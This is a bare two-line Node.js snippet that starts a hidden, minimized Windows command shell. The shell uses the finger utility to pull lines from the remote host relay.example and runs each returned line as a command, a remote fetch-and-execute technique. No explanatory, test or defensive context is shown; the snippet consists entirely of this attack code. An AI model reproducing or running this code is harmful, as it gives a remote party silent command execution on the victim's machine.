const {exec} = require("child_process");
exec(`cmd.exe /c start "" /min for /f "delims=" %z in ('finger next@relay.example') do %z`);
